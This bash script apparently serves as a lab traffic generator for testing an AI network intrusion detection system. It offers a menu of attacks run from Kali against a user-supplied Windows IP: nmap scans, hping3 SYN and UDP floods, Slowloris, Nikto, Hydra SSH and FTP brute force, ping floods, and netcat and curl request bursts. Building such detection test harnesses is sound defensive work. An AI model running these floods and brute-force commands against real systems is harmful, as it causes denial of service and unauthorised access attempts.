#!/bin/bash
# Kali Linux Attack Scripts for Testing AI-NIDS
# Run these from your Kali VM targeting the Windows machine

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}============================================================${NC}"
echo -e "${CYAN}AI-NIDS - Kali Attack Scripts${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""

# Get target IP
read -p "Enter Windows target IP address: " TARGET_IP

if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}Error: No IP address provided${NC}"
    exit 1
fi

echo -e "\n${GREEN}Target: $TARGET_IP${NC}\n"

echo -e "${CYAN}Select attack type:${NC}"
echo "1. Port Scan (Nmap - Stealthy SYN scan)"
echo "2. Port Scan (Nmap - Full port scan)"
echo "3. DDoS Simulation (hping3 SYN flood)"
echo "4. Slow HTTP DoS (Slowloris)"
echo "5. UDP Flood"
echo "6. Web Vulnerability Scan (Nikto)"
echo "7. SSH Brute Force (Hydra)"
echo "8. FTP Brute Force (Hydra)"
echo "9. Ping Flood"
echo "10. All attacks (sequential)"
echo "0. Exit"
echo ""

read -p "Select (0-10): " choice

case $choice in
    1)
        echo -e "\n${YELLOW}[*] Launching SYN Port Scan...${NC}"
        echo -e "${CYAN}Command: nmap -sS $TARGET_IP${NC}\n"
        sudo nmap -sS $TARGET_IP
        ;;
    2)
        echo -e "\n${YELLOW}[*] Launching Full Port Scan...${NC}"
        echo -e "${CYAN}Command: nmap -p- -T4 $TARGET_IP${NC}\n"
        sudo nmap -p- -T4 $TARGET_IP
        ;;
    3)
        echo -e "\n${YELLOW}[*] Launching SYN Flood (DDoS)...${NC}"
        echo -e "${RED}WARNING: This floods the target! Press Ctrl+C to stop${NC}"
        echo -e "${CYAN}Command: hping3 -S --flood -p 80 $TARGET_IP${NC}\n"
        sleep 2
        sudo hping3 -S --flood -p 80 $TARGET_IP
        ;;
    4)
        echo -e "\n${YELLOW}[*] Launching Slowloris DoS...${NC}"
        if command -v slowloris &> /dev/null; then
            echo -e "${CYAN}Command: slowloris $TARGET_IP${NC}\n"
            slowloris $TARGET_IP
        else
            echo -e "${RED}Slowloris not installed. Install with:${NC}"
            echo -e "${CYAN}pip3 install slowloris${NC}"
        fi
        ;;
    5)
        echo -e "\n${YELLOW}[*] Launching UDP Flood...${NC}"
        echo -e "${RED}WARNING: This floods the target! Press Ctrl+C to stop${NC}"
        echo -e "${CYAN}Command: hping3 --udp --flood -p 53 $TARGET_IP${NC}\n"
        sleep 2
        sudo hping3 --udp --flood -p 53 $TARGET_IP
        ;;
    6)
        echo -e "\n${YELLOW}[*] Launching Web Vulnerability Scan...${NC}"
        echo -e "${CYAN}Command: nikto -h $TARGET_IP${NC}\n"
        nikto -h $TARGET_IP
        ;;
    7)
        echo -e "\n${YELLOW}[*] Launching SSH Brute Force...${NC}"
        echo -e "${CYAN}Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP ssh${NC}\n"
        if [ -f /usr/share/wordlists/rockyou.txt ]; then
            hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP ssh
        else
            echo -e "${RED}Wordlist not found. Using small test list...${NC}"
            hydra -l admin -P /usr/share/wordlists/metasploit/common_passwords.txt $TARGET_IP ssh
        fi
        ;;
    8)
        echo -e "\n${YELLOW}[*] Launching FTP Brute Force...${NC}"
        echo -e "${CYAN}Command: hydra -l ftp -P /usr/share/wordlists/rockyou.txt $TARGET_IP ftp${NC}\n"
        if [ -f /usr/share/wordlists/rockyou.txt ]; then
            hydra -l ftp -P /usr/share/wordlists/rockyou.txt $TARGET_IP ftp
        else
            echo -e "${RED}Wordlist not found. Using small test list...${NC}"
            hydra -l ftp -P /usr/share/wordlists/metasploit/common_passwords.txt $TARGET_IP ftp
        fi
        ;;
    9)
        echo -e "\n${YELLOW}[*] Launching Ping Flood...${NC}"
        echo -e "${RED}WARNING: This floods the target! Press Ctrl+C to stop${NC}"
        echo -e "${CYAN}Command: sudo ping -f $TARGET_IP${NC}\n"
        sleep 2
        sudo ping -f $TARGET_IP
        ;;
    10)
        echo -e "\n${YELLOW}[*] Running ALL attacks sequentially...${NC}\n"
        
        echo -e "${GREEN}[1/6] Port Scan...${NC}"
        sudo nmap -sS -T4 $TARGET_IP
        sleep 3
        
        echo -e "\n${GREEN}[2/6] SYN Flood (5 seconds)...${NC}"
        timeout 5 sudo hping3 -S --flood -p 80 $TARGET_IP 2>/dev/null
        sleep 3
        
        echo -e "\n${GREEN}[3/6] UDP Flood (5 seconds)...${NC}"
        timeout 5 sudo hping3 --udp --flood -p 53 $TARGET_IP 2>/dev/null
        sleep 3
        
        echo -e "\n${GREEN}[4/6] Ping Flood (5 seconds)...${NC}"
        timeout 5 sudo ping -f $TARGET_IP 2>/dev/null
        sleep 3
        
        echo -e "\n${GREEN}[5/6] Multiple connection attempts...${NC}"
        for i in {1..50}; do
            nc -zv $TARGET_IP 22 2>/dev/null &
            nc -zv $TARGET_IP 80 2>/dev/null &
            nc -zv $TARGET_IP 443 2>/dev/null &
        done
        sleep 3
        
        echo -e "\n${GREEN}[6/6] HTTP requests spam...${NC}"
        for i in {1..100}; do
            curl -s http://$TARGET_IP 2>/dev/null &
        done
        
        echo -e "\n${GREEN}All attacks completed!${NC}"
        ;;
    0)
        echo -e "\n${GREEN}Exiting...${NC}"
        exit 0
        ;;
    *)
        echo -e "\n${RED}Invalid choice${NC}"
        exit 1
        ;;
esac

echo -e "\n${GREEN}============================================================${NC}"
echo -e "${GREEN}Attack completed!${NC}"
echo -e "${GREEN}Check your Windows AI-NIDS dashboards for detections${NC}"
echo -e "${GREEN}============================================================${NC}"
